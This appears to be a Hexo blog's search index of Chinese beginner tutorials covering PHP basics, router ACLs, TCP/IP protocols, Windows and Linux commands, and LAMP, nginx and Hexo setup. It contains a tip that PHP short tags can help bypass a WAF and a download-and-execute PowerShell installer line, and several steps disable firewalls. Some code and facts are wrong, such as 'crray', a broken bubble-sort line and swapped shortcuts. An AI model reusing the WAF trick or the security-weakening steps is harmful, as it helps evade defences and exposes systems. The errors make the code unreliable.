world&quot;,3).&quot;&lt;br&gt;&quot;;\t\t// lo worldecho substr(&quot;Hello world&quot;,7).&quot;&lt;br&gt;&quot;;\t\t//orld \t\t\t\t\t\t\t\t\t\t\t//空格也算是字符串的一位echo substr(&quot;Hello world&quot;,-1).&quot;&lt;br&gt;&quot;;\t\t//decho substr(&quot;Hello world&quot;,-10).&quot;&lt;br&gt;&quot;;\t\t//ello worldecho substr(&quot;Hello world&quot;,-8).&quot;&lt;br&gt;&quot;;\t\t//lo worldecho substr(&quot;Hello world&quot;,-4).&quot;&lt;br&gt;&quot;;\t\t//orld?&gt;\n\n14.trim()函数trim() 函数移除字符串两侧的空白字符或其他预定义字符。\n相关函数：\n\nltrim() - 移除字符串左侧的空白字符或其他预定义字符。\nrtrim() - 移除字符串右侧的空白字符或其他预定义字符。\n\n实例1移除字符串两侧的字符&lt;?php$str = &quot;Hello World!&quot;;echo $str . PHP_EOL;echo trim($str,&quot;Hed!&quot;);\t\t//输出  llo Worl?&gt;\n\n实例2移除字符串两侧的空格&lt;?php$str = &quot; Hello World! &quot;;echo &quot;Without trim: &quot; . $str;echo &quot;&lt;br&gt;&quot;;echo &quot;With trim: &quot; . trim($str);?&gt;\n\n实例3移除字符串两侧的换行符&lt;?php$str = &quot;nnnHello World!nnn&quot;;echo &quot;Without trim: &quot; . $str;echo &quot;&lt;br&gt;&quot;;echo &quot;With trim: &quot; . trim($str);?&gt;\n\n15.htmlspecialchars()函数htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。\n预定义的字符是：\n\n&amp; （和号）成为 &amp;\n“ （双引号）成为 &quot;\n‘ （单引号）成为 ‘\n&lt; （小于）成为 &lt;\n&gt; （大于）成为 &gt;\n\n实例把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体\n&lt;?php$str = &quot;This is some &lt;b&gt;bold&lt;/b&gt; text.&quot;;\t\techo htmlspecialchars($str);\t\t\t\t//输出结果不变?&gt;\n\n转换后\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;This is some &amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt; text.&lt;/body&gt;&lt;/html&gt;\n\n","categories":["php代码基础"],"tags":["php代码基础"]},{"title":"php基础（一）","url":"http://example.com/2022/01/04/php基础（一）/","content":"一：常见标记1.标准标记PHP 脚本以  结束：\n&lt;?php    echo &#x27;Hello World&#x27;;?&gt;     \t\t\t\t\t\t//标准的，所有的服务器都可用\n\n2.短标签类型&lt;?    echo &#x27;Hello World&#x27;;?&gt;    \t\t\t\t\t\t//短标签类型，需要配置php.ini配置文件\n\n3.短标签类型&lt;%    echo &#x27;Hello World&#x27;;%&gt;\t\t\t\t\t\t\t//短标签类型，需要配置php.ini配置文件，属于是asp的编写方式    \n\n4.特殊类的标记&lt;?= 123;  \techo &#x27;Hello World&#x27;;?&gt;        \t\t\t\t\t//特殊类的标签，大部分网站都可以，可以尝试用来绕waf\n\n5.特殊类标记&lt;script language=&quot;php&quot;&gt;    echo &#x27;Hello World&#x27;;&lt;/script&gt;\t\t\t\t//特殊类标签，类似于html标签，可用网站比较少    \n\n6.EOFPHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法。\n使用概述：\n\n\n必须后接分号，否则编译通不过。\n\n\n\nEOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。\n\n\n\n结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。**\n\n\n\n开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。\n\n\n\n当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。\n\n\n\n&lt;?phpecho &lt;&lt;&lt;EOF        &lt;h1&gt;我的第一个标题&lt;/h1&gt;        &lt;p&gt;我的第一个段落。&lt;/p&gt;EOF;// 结束需要独立一行且前后不能空格?&gt;\n\n\n\n二.变量及变量的数据类型1.变量的概念变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。\nPHP 变量规则：\n\n变量以 $ 符号开始，后面跟着变量的名称\n变量名必须以字母或者下划线字符开始\n变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）\n变量名不能包含空格\n变量名是区分大小写的（$y 和 $Y 是两个不同的变量）\n\n2.变量分类&lt;?php$b = 1;\t\t\t\t\t\t\t//整型  是一个没有小数的数字$b = 2.2;\t\t\t\t\t\t//浮点型 浮点数是带小数部分的数字，或是指数形式$b = &#x27;Hello World&#x27;;\t\t\t\t//字符串  类似 &quot;Hello World&quot; 这样一条文本被称为字符串$b = true||false ;      \t\t//布尔型$b = crray(1,2,3,4,5);  \t\t//数值数组$b = array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);\t\t//关联数组$b = null ; \t\t\t\t\t//空  表示没有值$b = new Object()\t\t\t\t//对象    \t\t\t\t\t\t\t//资源类型  网络连接 数据库连接 打开文件...?&gt;    \n\n三:常量1.常量概念常量是一个简单值的标识符。该值在脚本中不能改变。\n一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符)。\n注意： 常量在整个脚本中都可以使用\n2.使用语法该函数有三个参数:\n\nname：必选参数，常量名称，即标志符。\nvalue：必选参数，常量的值。\ncase_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的\n\nbool define ( string $name , mixed $value [, bool $case_insensitive = false ] )\n\n区分大小写的常量\n&lt;?php// 区分大小写的常量名define(&quot;GREETING&quot;, &quot;欢迎访问 Runoob.com&quot;);echo GREETING;    // 输出 &quot;欢迎访问 Runoob.com&quot;echo &#x27;&lt;br&gt;&#x27;;echo greeting;   // 输出 &quot;greeting&quot;，但是有警告信息，表示该常量未定义?&gt;\n\n不区分大小写的常量\n&lt;?php// 不区分大小写的常量名define(&quot;GREETING&quot;, &quot;欢迎访问 Runoob.com&quot;, true);echo greeting;  // 输出 &quot;欢迎访问 Runoob.com&quot;?&gt;\n\n四：输出函数1.常见的输出函数语句echo \t\t\t//输出print\t\t\t//输出var_dump\t\t//输出die\t\t\t\t//结束语句并输出    \n\n五：判断循环语句1.if…Else 语句if (条件)&#123;    条件成立时执行的代码;&#125;else&#123;\t条件不成立时执行的代码;&#125;\n\n实例\n&lt;?php$t=date(&quot;H&quot;);if ($t&lt;&quot;20&quot;)&#123;    echo &quot;Have a good day!&quot;;&#125;else&#123;    echo &quot;Have a good night!&quot;;&#125;?&gt;\n\n2.Switch 语句&lt;?phpswitch (n)&#123;case label1:    如果 n=label1，此处代码将执行;    break;case label2:    如果 n=label2，此处代码将执行;    break;default:    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;&#125;?&gt;\n\n实例\n&lt;?php$favcolor=&quot;red&quot;;switch ($favcolor)&#123;case &quot;red&quot;:    echo &quot;你喜欢的颜色是红色!&quot;;    break;case &quot;blue&quot;:    echo &quot;你喜欢的颜色是蓝色!&quot;;    break;case &quot;green&quot;:    echo &quot;你喜欢的颜色是绿色!&quot;;    break;default:    echo &quot;你喜欢的颜色不是 红, 蓝, 或绿色!&quot;;&#125;?&gt;\n\n3.while 循环while (条件)&#123;    要执行的代码;&#125;\n\n实例\n&lt;?php$i=1;while($i&lt;=5)&#123;    echo &quot;$i . &quot;&lt;br&gt;&quot;;\t   //输出变量$i的值    $i++;\t\t\t\t\t//$i = $i +1&#125;?&gt;\n\n4.for 循环for (初始值; 条件; 增量)&#123;    要执行的代码;&#125;\n\n冒泡排序实例\n&lt;?php$sum = array(8,12,6,20,90); \t\t//创建数组$a = count($sum);                   //数组的长度for($i = 0; $i&lt;$a-1;$i++)&#123;    for($c = 0; $c&lt;$a-$i-1; $c++)&#123;        if($sum[$c]&gt;$sum[$c+1])&#123;            $l = $sum[$c];            $sum[$c] = $sum[$c+1];            $sum[$c+1 = $l;        &#125;    &#125;&#125;print_r($sum) ;     ?&gt;                 \n\n","categories":["php代码基础"],"tags":["php代码基础"]},{"title":"交换机/路由应用","url":"http://example.com/2021/12/25/交换机路由应用/","content":"一：交换/路由基础1.交换机工作原理\n2.交换机工作模式及命令\n\n\n\n\n\n二：路由概述1.工作原理\n\n\n2.静态路由\n\n三：VLAN介绍及配置1.概述\n2.VLAN技术\n3.VLAN配置\n\n\n\n4.VlAN Trunk介绍\n\n\n\n\n四：访问控制ACL1.概念\n2.工作原理\n\n3.标准访问列表\n\n\n\n4.扩展访问列表\n五：配置ACL\n一：10网段禁止访问整个50网段\n输入为\nRouter(config)#access-list 1 deny 192.168.10.0 0.0.0.255\nRouter(config)#interface Gig0/2\nRouter(config-if)#ip access-group 1 out\n40网段可以被ping通\n\n50网段不可以被ping通\n\n二：40网段禁止访问50网段\n输入为\nRouter(config)#access-list 1 deny 192.168.40.0 0.0.0.255\nRouter(config)#interface Gig0/2\nRouter(config-if)#ip access-group 1 out\n50网段不可以被ping通\n \n10网段可以被ping通\n \n三：10网段禁止访问40网段\n输入为\nRouter(config)#access-list 1 deny 192.168.10.0 0.0.0.255\nRouter(config)#int\nRouter(config)#interface Gig0/0\nRouter(config-if)#ip access-group 1 out\n40网段不可以被ping通\n \n50网段可以被ping通\n\n","categories":["计算机网络"],"tags":["计算机网络"]},{"title":"TCP/UDP/DNS/DHCP协议分析","url":"http://example.com/2021/12/25/TCPUDPDNSDHCP协议分析/","content":"一：TCP协议分析1.概念\n2.TCP数据格段格式\n3.TCP数据段分析\n\n\n\n\n4.每个协议所占的端口\n5.TCP的连接建立（三次握手和四次挥手）1.三次握手第一次握手A的TCP向B发出连接请求报文段，其首部中的同步位 SYN=1，并选择序号seq=x， 表明传送数据时的第一个数据字节序号为x+1\n\n第一次握手报文分析\n由62525发起请求与9090建立连接。连接其首部中的同步位 SYN=1，并选择序号seq=0， 表明传送数据时的第一个数据字节序号为0+1\n\n第二次握手B 的 TCP 收到连接请求报文段后，如果同意，则发回确认 B 在确认报文段中，应使SYN=1，使ACK=1，其确认号是ack=x+1，自己选择的序号seq=y\n\n第二次握手报文分析\n由9090响应62525的请求。9090 的 TCP 收到连接请求报文段后，如果同意，则发回确认 62525 在确认报文段中，应使SYN=1，使ACK=1，其确认号是ack=0+1，自己选择的序号seq=0\n\n第三次握手. A 收到此报文段后，向B给出确认，其ACK=1，确认号 ack=y+1 A 的 TCP 通知上层应用进程，连接已经建立\n\n第三次握手报文分析\n62525 收到此报文段后，向9090给出确认，其ACK=1，确认号 ack=0+1 A 的 TCP 通知上层应用进程，连接已经建立.\n\n建立连接完成\n\n2.四次挥手第一次挥手数据传输结束后，通信的双方都可释放连接 现在，A的应用进程先向其TCP发出连接释放报文，并停止再发送数据，主动关闭TCP连接 A把连接释放报文段首部的FIN=1，其序号seq=u，等待B的确认\n\n第二次挥手1.服务器回复客户端，确认号ack=u+1； \n2.这个报文段自己的序号为seq=v，此时，TCP服务器进程通知高层应用进程； \n3.从客户端到服务器这个方向的连接就释放了； \n4.但TCP连接处于半关闭状态，FIN=0，代表服务器若要继续发送数据，客户端仍需要接收。\n\n第三次挥手\n1.若服务器已经没有要发给客户端的数据了，其应用进程就通知TCP释放连接； \n2.服务器的seq=v；ack=u+1；FIN=1； \n3.相当于服务器完成了数据传送，告知客户端我也完事了，FIN=1\n\n第三次挥手1.客户端向服务器发送确认报：ACK=1； \nFIN=0； \nseq=u+1； \nack=v+1； \n2.这代表着四次挥手全部完成，TCP连接进入关闭状态\n\n6.可靠的传输原理\n\n二:UDP协议分析1.概念\n2.报头格式\n\n三：TCP与CDP的区别\n四：DNS协议1.概念\n2.域名组成\n\n3.DNS解析\n\n4.字段含义\n五：DHCP协议1.概念\n2.字段含义\n\n3.DHCP工作原理\n\n","categories":["计算机网络"],"tags":["计算机网络"]},{"title":"ARP/IP/ICMP协议分析","url":"http://example.com/2021/12/23/ARPIPICMP协议分析/","content":"一：ARP协议分析1.概念它是是将IP地址解析为以太网MAC地址(或称物理地址)的协议 \n在局域网中，当主机或其他网络设备有数据要发送给另一个主机或设备时，必须知道对方的IP地址和MAC地址\n\n\n2.ARP缓存表\n3.ARP报文格式\n\n4.ARP请求与响应报文分析\n二：IP协议分析1.IP协议结构\n2.IP报头字段分析\n\n\n\n三：icmp协议分析1.概念\n2.ICMP报头分析\n3.类型及含义\n4.ICMP数据报头结构分析示例\n\n","categories":["计算机网络"],"tags":["计算机网络"]},{"title":"计算机网络基础","url":"http://example.com/2021/12/22/计算机网络基础/","content":"一：认识网络和网络设备1.计算机网络的组成\n2.传输介质\n3.网络设备\n\n\n\n\n\n4.常见的网络\n\n\n\n二:OSI模型和TCP/IP模型1.OSI分层思想\n\n2.每层的作用\n\n3.数据封装与接封装的过程\n\n\n4.TCP/IP协议模型\n5.OSI模型 VS TCP/IP模型\n\n6.TCP/IP协议族的组成\n7.设备与层的对应关系\n8各层间的通信\n","categories":["计算机网络"],"tags":["计算机网络"]},{"title":"windows基本使用及服务安装","url":"http://example.com/2021/12/20/windows基本使用及服务安装/","content":"一：常用DOS命令1.DOS概念\n2.ipconfig\n\n\n命令\n说明\n\n\n\nipconfig\n查看ip地址\n\n\nipconfig /release\n释放版本机现有的ip地址\n\n\nipconfig /renew\n重新向dhcp获取ip地址\n\n\nipconfig /all\n显示完整的ip地址\n\n\n3.用户及用户名\n\n\n命令\n说明\n\n\n\nnet user 账号名 密码 /add\n添加一个新用户\n\n\nnet user 账号名 /del\n删除用户\n\n\nnet user 账号名\n查看指定用户的详情信息\n\n\nnet localgroup\n产看本地用户组\n\n\n4.netstat\n\n\n命令\n说明\n\n\n\nnetstat -a\n查看本地机器开放端口\n\n\nnetstat -r\n列出当前的路由信息\n\n\nnetstat -n\n不对名字进行解析\n\n\n5.cd命令\n\n\n命令\n说明\n\n\n\ncd\\\n返回根目录\n\n\ncd ..\n返回上一层目录\n\n\ncd\n进入指定目录\n\n\n6.其他常用命令\n\n\n命令\n说明\n\n\n\ndir\n查看文件夹下的文件或目录\n\n\nmkdir(md)\n新建文件夹\n\n\nrmdir(rd)\n删除文件夹\n\n\ncopy\n复制文件或文件夹\n\n\ndel\n删除文件\n\n\nren\n改名\n\n\ntype\n查看文本文件\n\n\n7.防火墙命令netsh advfirewall firewall add rule name=icqtest dir=in action=allow protocol=tcp localport=3389     #增加本地的TCP的3389端口对外开放\n\n\n二：Windows服务安装1.安装IIS服务\n\n\n2.网站搭建\n\n\n\n","categories":["windows 2008 R2"],"tags":["windows"]},{"title":"Liunx软件安装和环境搭建","url":"http://example.com/2021/12/19/Liunx软件安装和环境搭建/","content":"一：Linux软件安装1.yum安装方法\n通过yum搜索并进行安装，或升级卸载\n\n2.RPM二进制包安装\n\n\n3.源码安装\n4.源码安装nginx下载nginx的压缩包并解压，找到并运行configure，编译文件，将文件复制到相应的位置，安装成功，运行nginx关闭防火墙\nwegt http://nginx.org/download/nginx-1.20.2.tar.gz  #下载压缩包tar -zxvf nginx-1.20.2.tar.gz     #解压./configure --prefix=/usr/local/nginx            #运行安装指定的位置make                      #编译文件make install              #将文件复制到相应的文件夹cd /usr/local/ngonx/sbin/   #文件所在位置./nginx                     #启动nginx\n\n\n\n\n二:网站环境搭建1.安装Apache环境使用yum下载\nyum -y install httpd httpd-devel httpd-manual mod_ssl   #下载安装Apachesystemctl start httpd           #启动apache服务systemctl enable httpd          #设置为开机自启动\n\n2.安装Mysql环境yum下载\nyum -y install mariadb-server mariadb   #安装Mysql和扩展包systemctl start mariadb     #安装完成后启动mysqlmysql -u root -p            #登陆mysql数据库systemctl enable mariadb    #设置为开机自启动\n\n3.安装PHP环境yum -y install php php-mysql php-common php-gd php-mbstring php-mcryptphp-devel php-xml   #安装php和扩展包systemctl restart httpd   #安装完成后重启httpd服务\n\n安装完成后在/var/www/html下新建一个1.php文件\n&lt;? phpphpinfo();?&gt;\n\nf浏览器访问虚拟机IP地址出现下图就说明配置成功\n\nLamp环境搭建完成。\n","categories":["CentoS 7基础"],"tags":["Linux"]},{"title":"Liunx用户和权限","url":"http://example.com/2021/12/19/Liunx用户和权限/","content":"一：Liunx用户与用户组1概念\n\n\n\n\n\n\n2.创建用户\n\n\n命令\n说明\n\n\n\nuseradd 用户名\n创建用户，同时创建与用户名同名的组\n\n\nuseradd –g 组名 用户名\n创建用户并指定用户组\n\n\nuseradd 用户名 –s xxx\n创建用户并指定用户登录后所使用的shell，如果值为 /sbin/nologin 或 者 /bin/false时，表示禁止该用户登录\n\n\nusermod –g 用户组 用户名\n修改用户所在用户组\n\n\nusermod –l 新用户名 用户名\n修改用户名\n\n\nuserdel 用户名\n删除用户，不删除用户的家目录（-r 参数同时删除家目录）\n\n\n3.创建用户组\n\n\n命令\n说明\n\n\n\ngroupadd\n创建用户组\n\n\ngroupdel\n删除指定用户组\n\n\n4.用户管理\n\n\n命令\n说明\n\n\n\nsu 用户名\n切换用户身份，如果不带参数，则切换为root身份\n\n\nid 用户名\n显示指定用户信息，包括用户编号、用户名，组编号、组名\n\n\nwhoami\n显示当前登录用户名\n\n\n二：Liunx权限控制1.概念\n\n\n2.文件夹/文件权限\n\n\n命令\n说明\n\n\n\nchmod u+x test.txt\n为文件的所有者附加执行权限\n\n\nchmod u=rwx test.txt\n为所有者赋予所有权限\n\n\nchmod a=rwx test.txt\n为所有人（所有者、所属组、其他人）赋予所有权限\n\n\nchmod 755 test.txt\n为文件赋予执行权限：rwxr-xr-x\n\n\n\n常用组合：777最高权限，644普通文件权限，755执行权限\n\n\n3.文件夹/文件所有者\n\n\n命令\n说明\n\n\n\nchown icq test\n将test文件的所有者修改为icq\n\n\nchown icq:icqtest test\n修改test文件的所有者和所有组修改为：icq、icqtest\n\n\n\n4.文件夹/文件所属组\n\n\n命令\n说明\n\n\n\nchgrp icqtest test.txt\n将 test.txt 文件的所属组由 root 更改为 icqtest\n\n\n\n5.显示、设置文件的默认权限\n\n\n命令\n说明\n\n\n\numask 022\n改变基础权限\n\n\n\n","categories":["CentoS 7基础"],"tags":["Linux"]},{"title":"day1liunx基础","url":"http://example.com/2021/12/19/day1liunx基础/","content":"一：liunx常用命令1.关机命令\n\n\n命令\n说明\n\n\n\npoweroff\n立刻关机\n\n\nhalt\n立刻关机（需要root权限）\n\n\nshutdown -h now\n立刻关机\n\n\ninit 0\n关机\n\n\n2.重启命令\n\n\n命令\n说明\n\n\n\ninit 6\n重新启动\n\n\nreboot\n立刻重启\n\n\nshutdown -r now\n立刻重启\n\n\n3.查看文件夹下的文件\n\n\n命令\n说明\n\n\n\nls\n查看文件夹下的文件\n\n\nls -l\n查看文件夹下的文件的详细信息\n\n\nls -lR\n递归查看文件夹下的文件的详细信息\n\n\nls -a\n查看隐藏文件\n\n\n4.创建文件夹及删除文件夹\n\n\n命令\n说明\n\n\n\nmkdir\n新建文件夹\n\n\nmkdir -p\n递归创建文件夹\n\n\nmkdir .\n创建隐藏文件夹\n\n\nrm\n删除文件或文件夹\n\n\nrm -rf\n递归删除文件或文件夹\n\n\n5.新建文件\n\n\n命令\n说明\n\n\n\ntouch\n新建文件夹\n\n\ntouch -t\n修改文件的时间\n\n\nvim\n新建并编辑文件\n\n\n6.复制\n\n\n命令\n说明\n\n\n\ncp 源文件 目标文件\n复制文件\n\n\ncp -r\n递归复制\n\n\n7.剪切移动重命名\n\n\n命令\n说明\n\n\n\nmv 源文件 目标文件\n移动文件（重命名）\n\n\n8.查看\n\n\n命令\n说明\n\n\n\ncat/grep/tail/head\n查看\n\n\nmore\n分页查看\n\n\n9.辅助命令\n\n\n命令\n说明\n\n\n\nTcb\n自动补齐\n\n\nCtrl+L\n清屏\n\n\nCtrl+K\n清空至行首\n\n\nCtrl+U\n清空至行尾\n\n\nCtrl+C\n中断执行命令\n\n\n10.打包与解包\n\n\n命令\n说明\n\n\n\ntar -cvf\n打包\n\n\ntar -xvf\n解包\n\n\n11.压缩命令\n\n\n命令\n说明\n\n\n\ntar -zcvf\n打包（gz)\n\n\ntar -zxvf\n解包（gz）\n\n\nzip\n打包（zip)\n\n\nunzip\n解包(zip)\n\n\n12.防火墙命令\n\n\n命令\n说明\n\n\n\nfirewall-cmd –reload\n防火墙重新加载配置\n\n\nfirewall-cmd –state\n查看防火墙状态\n\n\nfirewall-cmd –zone=public –list-ports\n查看防火墙开放那些端口\n\n\nfirewall-cmd –zone=public –list-service\n查看接受那些连接附服务\n\n\nfirewall-cmd –zone=public –add-port=80/tcp –permanent\n添加80端口为永久开放\n\n\nfirewall-cmd –zone=public –add-service=http –permanent\n永久添加http连接服务\n\n\nsystemctl stop firewalld\n关闭防火墙\n\n\nsystemctl start firewalld\n开启防火墙\n\n\n14.网络类命令\n\n\n命令\n说明\n\n\n\nip a\n查看ip地址\n\n\nip route\n查看路由信息\n\n\nss -antlp\n查看开放那些端口\n\n\nnslookup\n域名解析为ip\n\n\ntraceroute\n路由跟踪\n\n\nnetstat -antlp\n查看运行的端口\n\n\n15.服务类命令\n\n\n命令\n说明\n\n\n\nps -aux\n查看进程\n\n\nps -A | grep\n查看指定进程\n\n\ntop\n查看cpu\n\n\nkill -9\n结束进程\n\n\nw\n查看登录信息\n\n\nwho\n查看登录信息\n\n\n16特殊操作\n\n\n命令\n说明\n\n\n\nscreen -S name1\n创建新窗口\n\n\nscreen -ls\n列出所有后台的会话\n\n\nchattr +i\n文件添加保护\n\n\nvim编辑器的使用1.vim工作模式\n2.命令模式\n\n\n命令\n说明\n\n\n\ni\n光标所在处左侧输入\n\n\nI\n光标跳转行开头\n\n\no\n光标所在的下一行处输入新的一行\n\n\nO\n光标所在的上一行处输入新的一行\n\n\na\n光标所在处右侧输入\n\n\nA\n光标跳转行尾\n\n\nwq\n保存并退出\n\n\nq\n退出不保存\n\n\n/$\n搜索\n\n\n：n,ns/n/n/g(n为参数）\n替换第几行里的字符\n\n\n3.输入模式\n\n\n命令\n说明\n\n\n\no\n移动到这一行的最前面字符处\n\n\n$\n移动到这一行的最后面字符处\n\n\nn\n重复前一个搜寻的动作\n\n\nN\n重复前一个搜寻的动作\n\n\nx\n为向后剪切一个字符\n\n\ndd\n剪切游标所在的那一整行\n\n\nndd\n多行剪切\n\n\nu\n一直撤销\n\n\np\n粘贴\n\n\nliunx文件系统目录结构\n\n\n\n\n","categories":["CentoS 7基础"],"tags":["Linux"]},{"title":"搭建hexo博客","url":"http://example.com/2021/12/17/hexo博客搭建/","content":"一：简介​            Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好，中国大陆使用nginx网站用户有：百度、京东、新浪、网易、腾讯、淘宝等。 \n二：环境准备虚拟机CentoS 7     nginx+git\n三：安装1.虚拟机安装nginx下载nginx的压缩包并解压，找到并运行configure，编译文件，将文件复制到相应的位置，安装成功，运行nginx关闭防火墙\nwegt http://nginx.org/download/nginx-1.20.2.tar.gz  #下载压缩包tar -zxvf nginx-1.20.2.tar.gz     #解压./configure --prefix=/usr/local/nginx            #运行安装指定的位置make                      #编译文件make install              #将文件复制到相应的文件夹cd /usr/local/ngonx/sbin/   #文件所在位置./nginx                     #启动nginxsystemctl stop firewalld   #关闭防火墙\n\n浏览器中搜索虚拟机IP地址出现以下图片代表成功访问\n\n2.windows下载安装windows终端安装choco\n@powershell -NoProfile -ExecutionPolicy unrestricted -Command &quot;iex ((new-object net.webclient).DownloadString(&#x27;https://chocolatey.org/install.ps1&#x27;))&quot; &amp;&amp; SET PATH=%PATH%;%ALLUSERSPROFILE%\\chocolatey\\bin   \n\n通过choco安装git和nodejs\nchoco install git    #下载安装gitchoco install nodejs  #下载安装nodejs\n\n安装Hexo\nnpm install -g hexo-cli\n\n新建blog目录\nhexo init blog               #将源文件初始化如blog文件夹中\n\nblog文件夹下会出现下目录结构\n\n 然后我们进入blog这个文件夹中 右键打开终端\nhexo s —debug          #启动项目\n\n三：配置主题https://hexo.io/themes/     挑选主题的地址\nhttps://github.com/theme-kaze/hexo-theme-Kaze     我的主题的下载地址（有喜欢的可以下载）\n下载主题\n\n解压后将文件夹改名为kaze并将文件夹复制到blog/themes/文件夹下\n打开blog文件夹下的_config.yml文件用记事本等编辑工具打开\n将language：后面修改为  ch-CN (中文简体) 改变博客的语言\n\n将theme:后面修改为kaze\n\n保存并关闭\n打开blog\\themes\\kaze文件夹下的_config.yml文件用记事本等编辑工具打开\n修改博客的名称，作者名称，头像，logo  (在blog\\themes\\kaze\\source下新建img文件夹放入头像和logo或上传阿里oss方式添加链接)\n如图\n\n在biog文件夹下右键打开终端\nhexo clean      #清理缓存hexo g         #整合文件hexo s          #输出http://localhost:4000           #访问链接就能看到搭建好的博客页面了\n\n四：部署到虚拟机中通过finashell（或xshll）连接自己的虚拟机\n将 blog\\public 下的文件夹上传到虚拟机中 /usr/local/ngonx/html 文件夹下如下图\n\n浏览器访问虚拟机ip就可以看到搭建好的博客了\n","categories":["CentoS 7基础"],"tags":["Linux"]}]